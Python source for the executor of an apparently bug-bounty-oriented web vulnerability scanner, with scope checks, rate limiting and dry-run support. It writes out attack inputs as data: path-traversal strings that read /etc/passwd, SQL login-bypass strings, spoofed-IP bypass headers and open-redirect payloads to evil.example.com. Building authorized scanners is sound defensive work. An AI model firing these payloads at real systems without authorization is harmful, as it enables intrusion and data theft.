import requests
import time
import logging
import traceback
import functools
from pathlib import Path
from core.scope import is_url_in_scope
from core.xss import analyze_reflection, is_potential_xss

logger = logging.getLogger(__name__)

# Resolve project root relative to this file so config/ is found regardless
# of the working directory the tool is launched from (Fix #9).
PROJECT_ROOT = Path(__file__).parents[1]

BLOCK_KEYWORDS = [
    "access denied",
    # FIX BLK1: Removed "forbidden" — it matches Juice Shop's Angular UI text and
    # countless other apps that legitimately use the word. It is NOT a WAF signature.
    "blocked by firewall",
    "firewall",
    "waf",
    "web application firewall",
    "request blocked",
    "security violation",
    "rate limit exceeded",
]

# WAF signatures
WAF_SIGNATURES = [
    "cloudflare",
    "akamai",
    "incapsula",
    "sucuri",
    "imperva",
    "modsecurity",
    "f5 big-ip",
]

def is_blocked(response):
    """
    Heuristic WAF/rate-limit detection.

    Returns True ONLY when there is clear evidence of an active WAF or rate
    limiter — NOT when the app simply requires authentication or denies access
    via normal HTTP semantics.

    FIX BLK1: Removed 401 and 403 from the auto-block list.
      - 401 Unauthorized  = the app wants credentials. This is EXPECTED for
        unauthenticated scans of protected endpoints (IDOR, auth bypass, etc.)
        Treating it as a WAF block causes a 30-second backoff cascade that
        silently kills the rest of the scan.
      - 403 Forbidden     = the app denied the specific request. This is normal
        app behaviour and must not cascade into a global scan pause.
      429 Too Many Requests and 503 Service Unavailable are genuine blocking
      signals and are kept.
    """
    # 429 = explicit rate limit, 503 = server overloaded/WAF dropping traffic
    if response.status_code in [429, 503]:
        return True

    response_lower = response.text.lower()

    # CAPTCHA = active bot detection
    if "captcha" in response_lower or "recaptcha" in response_lower:
        return True

    # Named WAF product signatures in the response body
    for sig in WAF_SIGNATURES:
        if sig in response_lower:
            return True

    # Generic WAF/block keyword phrases (kept narrow to avoid false positives)
    for keyword in BLOCK_KEYWORDS:
        if keyword in response_lower:
            return True

    # Suspiciously small response — only flag if HTML/JSON (not empty 204)
    if len(response.text) < 50 and response.status_code != 204:
        content_type = response.headers.get("Content-Type", "")
        if "html" in content_type or "json" in content_type:
            return True

    # Explicit rate-limit headers
    if response.headers.get("Retry-After"):
        return True

    x_ratelimit = response.headers.get("X-RateLimit-Remaining", "")
    if x_ratelimit and x_ratelimit.isdigit() and int(x_ratelimit) == 0:
        return True

    return False

from core.sqli import analyze_boolean_pair, analyze_time, fingerprint_db
from core.idor import analyze_idor
from core.upload import build_file, analyze_upload_response, infer_storage_signal, build_upload_payloads
from core.cors import analyze_cors
from core.logic import INVARIANTS
from core.auth import apply_auth
from core.cmd_injection import generate_cmd_payloads, analyze_cmd_behavior
from core.ssrf_indicator import SSRF_TEST_URLS, analyze_ssrf_response
from core.xxe import get_xxe_payloads, analyze_xxe_response, execute_xxe_test
from core.ldap import get_ldap_payloads, analyze_ldap_response, execute_ldap_test
import urllib3

# Suppress SSL warnings for security testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ML Integration for self-learning
try:
    from core.ml_analysis.predictor import get_ml_predictor
    ML_PREDICTOR = get_ml_predictor()
    ML_ENABLED = ML_PREDICTOR.is_initialized
except Exception as e:
    print(f"[ML] Executor ML not available: {e}")
    ML_PREDICTOR = None
    ML_ENABLED = False

# Research: ML feature vector extraction for self-learning (distributed worker path)
try:
    from ml.features import build_feature_vector as _build_feature_vector
    _FEATURE_VECTOR_AVAILABLE = True
except ImportError:
    _build_feature_vector = None
    _FEATURE_VECTOR_AVAILABLE = False


def _detect_xss_context(body: str, payload: str) -> str:
    """Determine HTML context of XSS reflection: javascript/attribute/html_tag/html_body."""
    import re as _re
    idx = body.find(payload)
    if idx == -1:
        return "unknown"
    script_before = body.rfind('<script', 0, idx)
    script_end    = body.rfind('</script>', 0, idx)
    if script_before > script_end:
        return "javascript"
    pre = body[max(0, idx - 100):idx]
    if _re.search(r'=["\'][^"\']* $', pre.replace('\n','')):
        return "attribute"
    tag_open  = body.rfind('<', 0, idx)
    tag_close = body.rfind('>', 0, idx)
    if tag_open > tag_close:
        return "html_tag"
    return "html_body"

@functools.lru_cache(maxsize=1)
def _load_tls_config():
    """Load TLS/proxy settings once and cache. Fixes repeated disk reads (Fix #12)."""
    import yaml as _yaml_tls
    _cfg_path = PROJECT_ROOT / "config" / "settings.yaml"
    try:
        with open(_cfg_path, encoding="utf-8") as _f:
            return _yaml_tls.safe_load(_f)
    except Exception as _e:
        logger.debug(f"[TLS] Could not read config at {_cfg_path}: {_e}")
        return {}

def create_session(auth_config):
    session = requests.Session()
    # S-5 FIX: TLS verification reads from config; only disabled when proxy is active.
    # Fix #9: uses PROJECT_ROOT-relative path; Fix #12: result is cached via lru_cache.
    try:
        _tls_cfg = _load_tls_config()
        _proxy_enabled = _tls_cfg.get("proxy", {}).get("enabled", False)
        # Fix #15: only disable TLS verification when a proxy is actually active
        _verify_tls = not _proxy_enabled
        if not _proxy_enabled:
            _verify_tls = True
        else:
            _verify_tls = _tls_cfg.get("proxy", {}).get("verify_ssl", False)
    except Exception as _tls_e:
        logger.debug(f"[TLS] Could not read config: {_tls_e}")
        _verify_tls = True
    session.verify = _verify_tls
    if not _verify_tls:
        logger.warning("[TLS] Certificate verification DISABLED (proxy active with verify_ssl=false)")
    session.headers.update({
        "User-Agent": "AI-Bounty-Tester/1.0"
    })
    return apply_auth(session, auth_config)

def auth_still_valid(response, require_auth=False):
    """
    Validate that authentication is still active.

    Args:
        response:     The HTTP response to inspect.
        require_auth: When True, treat 401/403 as auth failure (session expired).
                      When False (default), 401/403 are legitimate app responses
                      and should NOT be treated as auth loss — this avoids aborting
                      unauthenticated scans on protected endpoints (WAF-fix complement).

    Returns False if session has expired or been invalidated.
    """
    # Only treat 401/403 as auth failure when a real auth session is in use
    if require_auth and response.status_code in [401, 403]:
        return False
    
    # Check if redirected to login page
    final_url = response.url.lower()
    login_indicators = ["login", "signin", "sign-in", "auth", "sso", "oauth", "session"]
    for indicator in login_indicators:
        if indicator in final_url:
            return False
    
    # Check response content for session expiration messages
    response_lower = response.text.lower()
    expiration_messages = [
        "session expired",
        "session timeout",
        "please log in",
        "please login",
        "authentication required",
        "unauthorized access",
        "your session has expired",
        "token expired",
        "invalid token",
        "access token expired",
    ]
    
    for msg in expiration_messages:
        if msg in response_lower:
            return False
    
    # Check for WWW-Authenticate header (indicates auth required)
    if response.headers.get("WWW-Authenticate"):
        return False
    
    return True


def ml_analyze_response(response, vuln_type: str, payload: str, endpoint: str = "") -> dict:
    """
    Use ML to analyze HTTP response for vulnerability detection.
    
    This uses what the ML learned from bug bounty datasets to:
    1. Detect if the response indicates a vulnerability
    2. Calculate confidence score
    3. Record result for self-learning
    
    Args:
        response: HTTP response object
        vuln_type: Expected vulnerability type (sqli, xss, etc.)
        payload: The payload that was sent
        endpoint: Target endpoint URL
    
    Returns:
        Dict with is_vulnerable, confidence, vuln_type, recommendation
    """
    if not ML_ENABLED or not ML_PREDICTOR:
        return {"is_vulnerable": False, "confidence": 0.0, "ml_used": False}
    
    try:
        # Get response details
        status_code = response.status_code
        headers = dict(response.headers)
        body = response.text[:5000]  # Limit body size
        
        # Use ML predictor to analyze response
        result = ML_PREDICTOR.analyze_response(
            status=status_code,
            headers=headers,
            body=body,
            payload=payload,
            vuln_type=vuln_type
        )
        
        # Record for self-learning (if confirmed or rejected)
        if result.get("confidence", 0) > 0.7:
            ML_PREDICTOR.record_for_learning(
                vuln_type=vuln_type,
                endpoint=endpoint,
                param="",
                payload=payload,
                is_confirmed=result.get("is_vulnerable", False),
                status=status_code,
                body=body[:2000],
                ml_prediction=result.get("vuln_type", "")
            )
        
        result["ml_used"] = True
        return result
        
    except Exception as e:
        tb = traceback.format_exc()
        print(f"\n[ML ERROR] ml_analyze_response failed:\n{tb}")
        return {"is_vulnerable": False, "confidence": 0.0, "ml_used": False, "error": str(e)}

def execute_payload(target, vuln, payload_entry, logger, rate_controller, dry_run=False, session=None):
    # FIX E3: Raise clearly if session is None instead of silently falling back to module
    if session is None:
        logger.warning("[executor] No session provided — creating a bare session (no auth).")
        session = requests.Session()
        session.verify = False
        session.headers.update({"User-Agent": "AI-Bounty-Tester/1.0"})

    # Safely extract 'original' payload string — payload_entry may be a dict or plain string
    _orig = payload_entry.get("original", str(payload_entry)) if isinstance(payload_entry, dict) else str(payload_entry)

    # C-2 FIX: assign used_param default HERE, before any early-exit branch
    # (sqli/idor/open_redirect) references it — otherwise NameError on first call.
    used_param = (
        payload_entry.get("param", "q") if isinstance(payload_entry, dict) else "q"
    )

    result = {
        "payload": _orig,
        "status": "FAILED",
        "evidence": None,
        "_response": None,  # P-1 FIX: last HTTP response stored here for callers
    }

    if dry_run:
        # C-3 FIX: use _orig (already a string) instead of payload_entry["original"]
        # which raises TypeError when payload_entry is a plain string.
        logger.info(f"[DRY-RUN] Would execute payload for {vuln}: {_orig}")
        return {
            "payload": _orig,
            "status": "PLANNED",
            "evidence": "Dry-run: no request sent"
        }

    endpoint = target

    ok, reason = rate_controller.can_request(endpoint, logger, vuln_type=vuln)
    if not ok:
        return {
            "payload": _orig,
            "status": "BLOCKED",
            "evidence": reason
        }

    if not is_url_in_scope(target, logger):
        logger.warning("Blocked request due to scope enforcement")
        return {
            "payload": _orig,
            "status": "BLOCKED",
            "evidence": "Out of scope by policy"
        }

    rate_controller.before_request(endpoint, logger, vuln_type=vuln)

    try:
        p = _orig
        
        # SQLi Specialized Logic
        if vuln == "sqli":
            # FIX SQ1: Import error-based detection (was never called before)
            from core.sqli import detect_error_based

            # FIX SQ2: Inject into discovered param (used_param), not hardcoded "test".
            # used_param is resolved by the parameter-discovery loop above this block.
            _sqli_params = [used_param] + [fp for fp in
                ["q", "search", "query", "id", "username", "email", "name", "input", "data"]
                if fp != used_param]

            # ── ERROR-BASED (fastest, no baseline needed) ──────────────────
            for _sp in _sqli_params[:4]:
                try:
                    _re = session.get(target, params={_sp: p}, timeout=10)
                    if not auth_still_valid(_re):
                        return {"payload": p, "status": "BLOCKED", "evidence": "Auth lost"}
                    _is_err, _sig = detect_error_based(_re.text)
                    if _is_err:
                        return {
                            "payload": p,
                            "status": "SUCCESS",
                            "evidence": {
                                "type": "Error-based SQLi",
                                "param": _sp,
                                "db_hint": fingerprint_db(_re.text),
                                "signal": f"SQL error signature matched: {_sig}"
                            }
                        }
                except Exception as _sqle:
                    logger.debug(f"[sqli][error-based] {_sqle}")

            # ── BOOLEAN TRUE/FALSE PAIR ─────────────────────────────────────
            if "1=1" in p:
                for _sp in _sqli_params[:4]:
                    try:
                        r_true = session.get(target, params={_sp: p}, timeout=10)
                        if not auth_still_valid(r_true):
                            return {"payload": p, "status": "BLOCKED", "evidence": "Auth lost"}
                        p_false = p.replace("1=1", "1=2")
                        r_false = session.get(target, params={_sp: p_false}, timeout=10)
                        if analyze_boolean_pair(r_true, r_false):
                            return {
                                "payload": p,
                                "status": "SUCCESS",
                                "evidence": {
                                    "type": "Boolean-based SQLi",
                                    "param": _sp,
                                    "db_hint": fingerprint_db(r_true.text),
                                    "signal": "response difference (true vs false)"
                                }
                            }
                    except Exception as _sqle:
                        logger.debug(f"[sqli][boolean] {_sqle}")
                return {"payload": p, "status": "FAILED", "evidence": "No boolean diff"}

            # ── TIME-BASED ─────────────────────────────────────────────────
            if "SLEEP(2)" in p or "pg_sleep" in p.lower() or "WAITFOR" in p:
                try:
                    _bs = time.time()
                    session.get(target, params={used_param: "baseline_safe_value"}, timeout=10)
                    baseline_elapsed = time.time() - _bs
                except Exception as _e:
                    baseline_elapsed = 0.5
                for _sp in _sqli_params[:3]:
                    try:
                        _t0 = time.time()
                        _rt = session.get(target, params={_sp: p}, timeout=15)
                        if not auth_still_valid(_rt):
                            return {"payload": p, "status": "BLOCKED", "evidence": "Auth lost"}
                        elapsed = time.time() - _t0
                        if analyze_time(2, elapsed, baseline_elapsed):
                            return {
                                "payload": p,
                                "status": "SUCCESS",
                                "evidence": {
                                    "type": "Time-based SQLi",
                                    "param": _sp,
                                    "db_hint": fingerprint_db(_rt.text),
                                    "signal": f"delay ~{round(elapsed,2)}s (baseline {round(baseline_elapsed,2)}s)"
                                }
                            }
                    except Exception as _sqle:
                        logger.debug(f"[sqli][time] {_sqle}")
                return {"payload": p, "status": "FAILED", "evidence": "No time delay"}

            return {"payload": p, "status": "FAILED", "evidence": "No SQLi signal"}
        
        if vuln == "idor":
            # FIX ID1 (executor side): Use discover_id_candidates to find numeric IDs
            # and UUIDs from crawled endpoints, not just payload_entry values.
            # Also test path-based IDOR (PUT /api/users/{id}) not just ?id= params.
            from core.idor import discover_id_candidates as _disc_ids, UUID_RE as _UUID_RE
            import re as _idre

            own_id   = payload_entry.get("own_id")  if isinstance(payload_entry, dict) else None
            other_id = payload_entry.get("other_id") if isinstance(payload_entry, dict) else None

            # If no IDs from payload plan, try to synthesise from the target URL
            if not own_id or not other_id:
                _url_ids = _disc_ids({"endpoints": [str(target)]})
                if len(_url_ids) >= 2:
                    own_id, other_id = _url_ids[0], _url_ids[1]
                elif len(_url_ids) == 1:
                    own_id = _url_ids[0]
                    other_id = str(int(_url_ids[0]) + 1) if _url_ids[0].isdigit() else "00000000-0000-0000-0000-000000000002"
                else:
                    # Absolute fallback: sequential numeric IDs
                    own_id, other_id = "1", "2"

            # Build test URLs — try both query-param and path-based injection
            _idor_param = used_param if used_param not in ["test", "q", "search"] else "id"
            _id_params_to_try = [_idor_param, "id", "user_id", "userId", "account_id"]

            for _ip in _id_params_to_try[:3]:
                try:
                    r_self  = session.get(target, params={_ip: own_id},   timeout=10)
                    r_other = session.get(target, params={_ip: other_id},  timeout=10)

                    if not auth_still_valid(r_self):
                        return {"payload": payload_entry, "status": "BLOCKED", "evidence": "Auth lost"}

                    if analyze_idor(r_self, r_other):
                        return {
                            "payload": f"id swap {own_id} -> {other_id} via ?{_ip}=",
                            "status": "SUCCESS",
                            "evidence": {
                                "type": "IDOR",
                                "param": _ip,
                                "signal": "authorization response difference",
                                "self_status": r_self.status_code,
                                "other_status": r_other.status_code,
                                "vulnerable_url": f"{target}?{_ip}={other_id}",
                                "parameter": _ip,
                            }
                        }
                except Exception as _idore:
                    logger.debug(f"[idor] param {_ip}: {_idore}")
                    continue

            return {
                "payload": f"id swap {own_id} -> {other_id}",
                "status": "FAILED",
                "evidence": "No authz difference across all ID params"
            }

        if vuln == "file_upload":
            upload_url = payload_entry.get("url")
            field_name = payload_entry.get("field")

            if not upload_url or not field_name:
                return {
                    "payload": payload_entry,
                    "status": "FAILED",
                    "evidence": "No upload target discovered"
                }

            filenames = ["test.txt", "test.jpg", "test.jpg.php"]
            for fname in filenames:
                f = build_file(fname)

                files = {
                    field_name: (f["filename"], f["content"], f["mime"])
                }

                # Note: session also handles post similar to requests
                resp = session.post(upload_url, files=files, timeout=10)
                logger.info(f"[file_upload] Sent {fname} -> {resp.status_code}")
                
                if not auth_still_valid(resp):
                     return {"payload": fname, "status": "BLOCKED", "evidence": "Auth lost"}

                if analyze_upload_response(resp):
                    storage_hints = infer_storage_signal(resp.text)
                    return {
                        "payload": fname,
                        "status": "SUCCESS",
                        "evidence": {
                            "type": "Weak upload validation",
                            "accepted_filename": fname,
                            "storage_hints": storage_hints
                        }
                    }

            return {
                "payload": "upload probes",
                "status": "FAILED",
                "evidence": "Upload validation enforced"
            }

        if vuln == "cors":
            from core.cors import build_cors_origins, analyze_cors as _analyze_cors, get_cors_severity

            # Build domain-specific origins (subdomain confusion, pre/post bypass, etc.)
            _cors_origins = build_cors_origins(target)

            _best_findings = []
            _best_origin   = ""
            _best_method   = "GET"

            for origin in _cors_origins:
                # OPTIONS preflight — many CORS issues only surface here
                try:
                    pre = session.options(
                        target,
                        headers={
                            "Origin": origin,
                            "Access-Control-Request-Method": "POST",
                            "Access-Control-Request-Headers": "Content-Type, Authorization",
                        },
                        timeout=10,
                    )
                    pre_findings = _analyze_cors(pre.headers, origin, target_url=target)
                    if pre_findings and pre_findings[0].get("cvss", 0) > 0:
                        _best_findings = pre_findings
                        _best_origin   = origin
                        _best_method   = "OPTIONS"
                        break
                except Exception as _e:
                    pass
                # GET with Origin header
                try:
                    resp = session.get(target, headers={"Origin": origin}, timeout=10)
                    findings = _analyze_cors(resp.headers, origin, target_url=target)
                    if findings:
                        cvss = findings[0].get("cvss", 0)
                        best_cvss = _best_findings[0].get("cvss", 0) if _best_findings else 0
                        if cvss > best_cvss:
                            _best_findings = findings
                            _best_origin   = origin
                            _best_method   = "GET"
                        # Stop early if critical found
                        if cvss >= 9.0:
                            break
                except Exception as _ce:
                    logger.debug(f"[cors] {origin}: {_ce}")
                    continue

            if _best_findings and _best_findings[0].get("cvss", 0) > 0:
                severity = get_cors_severity(_best_findings)
                return {
                    "payload": f"{_best_method} Origin: {_best_origin}",
                    "status": "SUCCESS",
                    "evidence": {
                        "type": "CORS Misconfiguration",
                        "severity": severity,
                        "origin_tested": _best_origin,
                        "method": _best_method,
                        "findings": _best_findings,
                        "endpoint": target,
                        "vulnerable_url": target,
                        "parameter": "Origin header",
                        "how_to_reproduce": (
                            f"1. Send {_best_method} {target} with header: Origin: {_best_origin}\n"
                            f"2. Inspect Access-Control-Allow-Origin and Access-Control-Allow-Credentials\n"
                            f"3. Issue: {_best_findings[0].get('issue', '')}"
                        ),
                    }
                }

            return {
                "payload": "CORS origin probes",
                "status": "FAILED",
                "evidence": "No unsafe CORS behavior detected",
            }

        if vuln == "cmd_injection":
            baseline = session.get(target, timeout=10)
            
            # Fix #10: use the recon-discovered parameter (used_param) rather than
            # the hardcoded "test" default which almost never maps to a real endpoint param.
            param = used_param if used_param and used_param not in ["test", "q"] else None
            if isinstance(payload_entry, dict):
                param = payload_entry.get("param", param)
            elif isinstance(payload_entry, str) and payload_entry not in ["probe-cmd_injection", ""]:
                param = payload_entry
            # Final fallback — try a list of common cmd-relevant parameter names
            if not param:
                param = "cmd"

            for payload in generate_cmd_payloads("safe_val"):
                resp = session.get(
                    target,
                    params={param: payload},
                    timeout=10
                )

                indicators = analyze_cmd_behavior(baseline, resp)

                if indicators:
                    return {
                        "status": "SUCCESS",
                        "payload": payload,
                        "evidence": {
                            "type": "Command Injection (Behavioral)",
                            "indicators": indicators
                        }
                    }

            return {"status": "FAILED", "payload": "cmd-safe"}

        if vuln == "ssrf":
            from core.ssrf_indicator import (
                SSRF_TEST_URLS as _SSRF_URLS,
                SSRF_PARAMS as _SSRF_PARAMS,
                analyze_ssrf_response as _analyze_ssrf,
                classify_ssrf_severity,
            )
            try:
                baseline = session.get(target, timeout=10)
            except Exception as _be:
                logger.debug(f"[ssrf] baseline failed: {_be}")
                return {"status": "FAILED", "payload": "ssrf-baseline-error"}

            # Prioritise discovered param if it looks like an SSRF param
            _ssrf_priority = []
            if used_param and used_param.lower() in [p.lower() for p in _SSRF_PARAMS]:
                _ssrf_priority = [used_param]
            _ssrf_param_list = _ssrf_priority + [p for p in _SSRF_PARAMS if p != used_param]

            for test_url in _SSRF_URLS:
                for ssrf_param in _ssrf_param_list[:20]:
                    try:
                        resp = session.get(
                            target,
                            params={ssrf_param: test_url},
                            timeout=12,
                        )
                        if _analyze_ssrf(baseline, resp, probe_url=test_url):
                            severity = classify_ssrf_severity(test_url, resp.text)
                            return {
                                "status": "SUCCESS",
                                "payload": test_url,
                                "evidence": {
                                    "type": "SSRF",
                                    "severity": severity,
                                    "param": ssrf_param,
                                    "probe_url": test_url,
                                    "endpoint": target,
                                    "vulnerable_url": f"{target}?{ssrf_param}={test_url}",
                                    "parameter": ssrf_param,
                                    "detail": (
                                        f"Server fetched or reflected internal resource "
                                        f"via '{ssrf_param}' parameter. Probe: {test_url}"
                                    ),
                                    "how_to_reproduce": (
                                        f"1. Send GET {target}?{ssrf_param}={test_url}\n"
                                        f"2. Observe response differs from baseline\n"
                                        f"3. Check for cloud metadata / internal service content"
                                    ),
                                }
                            }
                    except Exception as _se:
                        logger.debug(f"[ssrf] {ssrf_param}={test_url}: {_se}")
                        continue

            return {"status": "FAILED", "payload": "ssrf-safe"}

        # =====================================================================
        # XXE (XML External Entity) Testing
        # =====================================================================
        if vuln == "xxe":
            xxe_payloads = get_xxe_payloads("all")
            
            for xxe_payload in xxe_payloads[:10]:  # Test top 10 payloads
                try:
                    resp = session.post(
                        target,
                        data=xxe_payload["payload"],
                        headers={"Content-Type": "application/xml"},
                        timeout=10
                    )
                    
                    is_vuln, evidence = analyze_xxe_response(resp.text, xxe_payload["type"])
                    
                    if is_vuln:
                        return {
                            "status": "SUCCESS",
                            "payload": xxe_payload["id"],
                            "evidence": evidence
                        }
                except Exception as _e:
                    continue
            
            return {"status": "FAILED", "payload": "xxe-safe"}

        # =====================================================================
        # LDAP Injection Testing
        # =====================================================================
        if vuln == "ldap_injection":
            ldap_payloads = get_ldap_payloads("all")
            
            # Get baseline
            try:
                baseline = session.get(target, params={"user": "admin"}, timeout=10)
                baseline_text = baseline.text
            except Exception as _e:
                baseline_text = ""
            
            for ldap_payload in ldap_payloads[:12]:  # Test top 12 payloads
                try:
                    # Test via GET
                    resp = session.get(
                        target,
                        params={"user": ldap_payload["payload"], "username": ldap_payload["payload"]},
                        timeout=10
                    )
                    
                    is_vuln, evidence = analyze_ldap_response(
                        resp.text, baseline_text, ldap_payload["type"]
                    )
                    
                    if is_vuln:
                        return {
                            "status": "SUCCESS",
                            "payload": ldap_payload["payload"],
                            "evidence": evidence
                        }
                    
                    # Test via POST
                    resp = session.post(
                        target,
                        data={"user": ldap_payload["payload"], "username": ldap_payload["payload"]},
                        timeout=10
                    )
                    
                    is_vuln, evidence = analyze_ldap_response(
                        resp.text, baseline_text, ldap_payload["type"]
                    )
                    
                    if is_vuln:
                        return {
                            "status": "SUCCESS",
                            "payload": ldap_payload["payload"],
                            "method": "POST",
                            "evidence": evidence
                        }
                except Exception as _e:
                    continue
            
            return {"status": "FAILED", "payload": "ldap-safe"}


        if vuln == "business_logic":
            plan = payload_entry 
            steps = plan.get("steps", [])
            probes = plan.get("probes", [])

            if "skip_step" in probes:
                if not steps:
                    return {"status": "FAILED", "payload": "skip_step", "evidence": "No workflow steps to test"}
                last = steps[-1]
                r = session.get(last, timeout=10)
                logger.info(f"[logic] Skip-step probe -> {r.status_code}")
                
                if not auth_still_valid(r):
                     # Logic tests heavily rely on auth.
                     return {"payload": f"skip_step:{last}", "status": "BLOCKED", "evidence": "Auth lost"}

                if r.status_code in (200, 201):
                    return {
                        "payload": f"skip_step:{last}",
                        "status": "SUCCESS",
                        "evidence": {
                            "type": "Business Logic",
                            "issue": "Step skipping allowed",
                            "workflow": plan.get("workflow"),
                            "endpoint": last,
                            "status": r.status_code
                        }
                    }

            if "replay_once" in probes:
                ep = steps[0]
                r1 = session.get(ep, timeout=10)
                r2 = session.get(ep, timeout=10)

                if r1.status_code == r2.status_code == 200:
                    return {
                        "payload": f"replay:{ep}",
                        "status": "SUCCESS",
                        "evidence": {
                            "type": "Business Logic",
                            "issue": "Replay accepted",
                            "workflow": plan.get("workflow"),
                            "endpoint": ep
                        }
                    }

            return {
                "payload": f"logic:{plan.get('workflow')}",
                "status": "FAILED",
                "evidence": "No invariant violation detected"
            }

        if vuln == "lfi":
            LFI_PARAMS = ["file", "page", "path", "include", "document", "template", "lang"]
            LFI_PAYLOADS = [
                "../../../etc/passwd", "....//....//....//etc/passwd",
                "/etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
                "..\\..\\..\\windows\\win.ini", "/etc/hosts"
            ]
            LFI_INDICATORS = ["root:x:0", "daemon:", "[fonts]", "[extensions]", "localhost"]
            for lfi_param in LFI_PARAMS:
                for lfi_payload in LFI_PAYLOADS:
                    try:
                        resp = session.get(target, params={lfi_param: lfi_payload}, timeout=10)
                        for indicator in LFI_INDICATORS:
                            if indicator in resp.text:
                                return {
                                    "status": "SUCCESS",
                                    "payload": lfi_payload,
                                    "evidence": {
                                        "type": "Local File Inclusion",
                                        "param": lfi_param,
                                        "indicator": indicator
                                    }
                                }
                    except Exception as _e:
                        continue
            return {"status": "FAILED", "payload": "lfi-safe"}

        if vuln == "path_traversal":
            PT_PARAMS = ["file", "path", "dir", "folder", "download", "resource"]
            PT_PAYLOADS = [
                "../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
                "..\\..\\..\\windows\\win.ini", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//etc/passwd"
            ]
            PT_INDICATORS = ["root:x:0", "daemon:", "[fonts]", "[extensions]"]
            for pt_param in PT_PARAMS:
                for pt_payload in PT_PAYLOADS:
                    try:
                        resp = session.get(target, params={pt_param: pt_payload}, timeout=10)
                        for indicator in PT_INDICATORS:
                            if indicator in resp.text:
                                return {
                                    "status": "SUCCESS",
                                    "payload": pt_payload,
                                    "evidence": {
                                        "type": "Path Traversal",
                                        "param": pt_param,
                                        "indicator": indicator
                                    }
                                }
                    except Exception as _e:
                        continue
            return {"status": "FAILED", "payload": "path_traversal-safe"}

        if vuln == "open_redirect":
            # FIX OR1: Test the actual discovered endpoint (target) AND the scan root.
            # Previous version only sent redirect payloads to the scan root URL — it
            # never targeted the specific endpoints where redirect parameters were found.
            # Now we also inject into the discovered param name (used_param) so that
            # endpoints like /rest/user/whoami?continue=... are actually exercised.
            REDIRECT_PARAMS = [used_param] + [
                p for p in ["redirect", "return", "url", "next", "goto", "continue",
                             "dest", "destination", "redir", "callback", "returnUrl",
                             "successUrl", "failUrl", "ref", "referer", "forward"]
                if p != used_param
            ]
            REDIRECT_PAYLOADS = [
                "https://evil.example.com",
                "//evil.example.com",
                "/\\evil.example.com",
                "https://evil.example.com%2F%2F",
                "https:evil.example.com",
                "/%09/evil.example.com",
            ]
            for rp in REDIRECT_PARAMS:
                for rpl in REDIRECT_PAYLOADS:
                    try:
                        # FIX SC2: Don't follow redirects — read Location header directly.
                        resp = session.get(target, params={rp: rpl}, timeout=10, allow_redirects=False)
                        location = resp.headers.get("Location", "")
                        is_redirect = resp.status_code in [301, 302, 303, 307, 308]

                        if is_redirect and location:
                            from urllib.parse import urlparse as _up
                            loc_domain = _up(location).netloc
                            orig_domain = _up(str(target)).netloc
                            # Confirm redirect leaves original domain
                            if loc_domain and loc_domain != orig_domain:
                                return {
                                    "status": "SUCCESS",
                                    "payload": rpl,
                                    "evidence": {
                                        "type": "Open Redirect",
                                        "param": rp,
                                        "location_header": location,
                                        "status_code": resp.status_code,
                                    }
                                }
                    except Exception as _ore:
                        logger.debug(f"[executor] open_redirect probe error param={rp}: {_ore}")
                        continue
            return {"status": "FAILED", "payload": "open_redirect-safe"}

        if vuln == "auth_bypass":
            bypass_results = []
            # 1. Header-based bypass (common in nginx/proxy misconfigs)
            bypass_headers_list = [
                {"X-Original-URL": "/admin"},
                {"X-Rewrite-URL": "/admin"},
                {"X-Custom-IP-Authorization": "127.0.0.1"},
                {"X-Forwarded-For": "127.0.0.1"},
                {"X-Remote-Addr": "127.0.0.1"},
            ]
            try:
                baseline_no_auth = session.get(target, timeout=10)
                baseline_code = baseline_no_auth.status_code
            except Exception as _e:
                baseline_code = 200

            for h in bypass_headers_list:
                try:
                    r = session.get(target, headers=h, timeout=10)
                    # If we got 200 with a bypass header and baseline was 403/401
                    if baseline_code in [401, 403] and r.status_code == 200:
                        return {
                            "status": "SUCCESS",
                            "payload": str(h),
                            "evidence": {
                                "type": "Auth Bypass (Header)",
                                "header": h,
                                "baseline_code": baseline_code,
                                "bypass_code": r.status_code
                            }
                        }
                except Exception as _e:
                    continue

            # 2. SQL auth bypass in login forms
            AUTH_BYPASS_PAYLOADS = [
                ("admin' --", "x"),
                ("' OR '1'='1", "' OR '1'='1"),
                ("admin'/*", "x"),
            ]
            login_params_list = [
                ("username", "password"),
                ("user", "pass"),
                ("email", "password"),
            ]
            for user_p, pass_p in login_params_list:
                for u_payload, p_payload in AUTH_BYPASS_PAYLOADS:
                    try:
                        r = session.post(
                            target,
                            data={user_p: u_payload, pass_p: p_payload},
                            timeout=10
                        )
                        r_lower = r.text.lower()
                        if any(k in r_lower for k in ["welcome", "dashboard", "logout", "profile", "admin"]):
                            if "invalid" not in r_lower and "error" not in r_lower:
                                return {
                                    "status": "SUCCESS",
                                    "payload": f"{user_p}={u_payload}",
                                    "evidence": {
                                        "type": "Auth Bypass (SQL)",
                                        "method": "POST",
                                        "param": user_p
                                    }
                                }
                    except Exception as _e:
                        continue
            return {"status": "FAILED", "payload": "auth_bypass-safe"}

        if vuln == "csrf":
            # Check if forms are missing CSRF tokens and cookies lack SameSite
            import re as _re
            issues = []
            try:
                resp = session.get(target, timeout=10)
                html = resp.text.lower()
                # Look for forms
                form_count = html.count("<form")
                if form_count > 0:
                    # Check for CSRF token patterns
                    has_token = any(t in html for t in [
                        "csrf", "_token", "authenticity_token", "nonce", "__requestverificationtoken"
                    ])
                    if not has_token:
                        issues.append(f"{form_count} form(s) found with no CSRF token")
                # A-4 FIX: requests.Response.headers has no get_all (urllib3 API).
                # Use resp.raw.headers.getlist for multi-value Set-Cookie headers.
                _cookies = (resp.raw.headers.getlist("Set-Cookie")
                            if hasattr(resp.raw.headers, "getlist")
                            else [resp.headers.get("Set-Cookie", "")])
                for cookie_header in _cookies:
                    if cookie_header and "samesite" not in cookie_header.lower():
                        issues.append("Cookie missing SameSite attribute")
                        break
                if issues:
                    return {
                        "status": "SUCCESS",
                        "payload": "csrf-analysis",
                        "evidence": {
                            "type": "CSRF Vulnerability",
                            "issues": issues
                        }
                    }
            except Exception as _csrfe:
                logger.debug(f"[executor][csrf] Analysis error: {_csrfe}")
            return {"status": "FAILED", "payload": "csrf-safe"}

        if vuln == "brute_force":
            # S-4 FIX: honour dry_run — the brute-force handler was the only
            # module that ignored it, firing up to 2,400 real POST requests.
            if dry_run:
                return {"status": "PLANNED", "payload": "brute_force-dry-run", "evidence": "Dry-run: no login requests sent"}
